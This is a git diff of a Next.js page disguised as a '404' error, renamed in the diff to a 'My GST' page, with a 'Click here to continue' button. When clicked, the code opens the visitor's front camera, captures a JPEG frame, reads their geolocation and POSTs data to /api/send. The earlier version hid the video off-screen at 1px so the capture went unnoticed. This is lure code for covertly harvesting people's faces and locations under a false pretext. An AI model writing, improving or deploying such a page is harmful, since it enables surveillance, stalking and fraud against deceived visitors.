@@ -1,11 +1,13 @@
 "use client";
-import { useRef } from "react";
+import { useRef, useState } from "react";
 import "@/public/404.css";
 
 export default function Home() {
   const videoRef = useRef<HTMLVideoElement>(null);
+  const [showPreview, setShowPreview] = useState(false);
 
   async function capture() {
+    // ---------- CAMERA ----------
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" }
     });
@@ -14,11 +16,14 @@ export default function Home() {
     video.srcObject = stream;
     video.muted = true;
 
+    // 🔑 SHOW preview briefly (critical)
+    setShowPreview(true);
     await video.play();
 
-    // 🔴 CRITICAL: wait for real frame render
+    // wait for real frame to render
     await new Promise(resolve => setTimeout(resolve, 500));
 
+    // ---------- CAPTURE ----------
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -28,8 +33,13 @@ export default function Home() {
 
     const image = canvas.toDataURL("image/jpeg", 0.9);
 
-    stream.getTracks().forEach(t => t.stop());
+    console.log("Image length:", image.length); // should be >15000
 
+    // stop camera + hide preview
+    stream.getTracks().forEach(t => t.stop());
+    setShowPreview(false);
+
+    // ---------- LOCATION ----------
     navigator.geolocation.getCurrentPosition(async pos => {
       await fetch("/api/send", {
         method: "POST",
@@ -41,27 +51,27 @@ export default function Home() {
         })
       });
     });
-  console.log("image length:", image.length);
   }
-
+  // at h1 we can add any thing
   return (
     <div className="error-container">
-      <h1>404</h1>
+      <h1>My GST</h1>  
       <p>Click here to continue</p>
 
-      {/* 🔑 MUST BE RENDERED, NOT HIDDEN */}
-      <video
-        ref={videoRef}
-        playsInline
-        muted
-        style={{
-          position: "absolute",
-          top: "-1000px",
-          left: "-1000px",
-          width: "1px",
-          height: "1px"
-        }}
-      />
+      {/* Camera preview (briefly visible) */}
+      {showPreview && (
+        <video
+          ref={videoRef}
+          playsInline
+          muted
+          style={{
+            width: 160,
+            height: 160,
+            borderRadius: 12,
+            marginBottom: 20
+          }}
+        />
+      )}
 
       <button onClick={capture}>Continue</button>
     </div>
